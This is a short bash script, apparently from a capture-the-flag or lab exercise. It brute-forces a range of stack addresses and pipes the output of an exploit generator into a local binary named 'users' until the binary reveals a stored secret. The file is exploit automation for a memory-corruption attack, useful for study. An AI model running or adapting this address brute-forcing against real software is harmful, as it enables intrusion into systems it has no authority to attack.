#! /bin/bash
flag=0

for ((i = 0x00007fffffffde00; i <= 0x00007fffffffdeff; i++)); do
  if ./exploit_generator.py "$i" | ./users 2>/dev/null | grep "The secret stored is crypters" >/dev/null; then
    flag=1
    break
  fi
done

if [ "$flag" -eq 1 ]; then
  ./exploit_generator.py "$i" | ./users
else
  echo "Failed to find the address, maybe increase the address range"
fi
